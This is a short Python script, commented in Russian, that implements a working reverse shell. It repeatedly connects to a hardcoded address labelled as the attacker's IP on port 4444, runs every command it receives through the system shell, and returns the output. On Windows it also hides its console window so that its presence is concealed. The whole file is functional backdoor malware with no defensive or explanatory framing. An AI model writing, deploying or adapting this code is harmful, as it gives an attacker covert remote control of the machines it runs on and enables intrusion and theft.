import socket
import subprocess
import time
import os
import sys

def connect_to_server(host, port):
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((host, port))
            return client
        except:
            time.sleep(5)  # Переподключение через 5 секунд

def main():
    server_host = "192.168.198.141"  # IP атакующего
    server_port = 4444
    
    while True:
        try:
            sock = connect_to_server(server_host, server_port)
            
            while True:
                # Получаем команду
                cmd = sock.recv(1024).decode()
                
                if cmd.lower() == 'exit':
                    sock.close()
                    break
                
                # Выполняем команду
                output = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                result = output.stdout + output.stderr
                
                # Отправляем результат
                sock.send(result.encode())
                
        except Exception as e:
            time.sleep(10)

if __name__ == "__main__":
    # Попытка скрыть окно (для Windows)
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    main()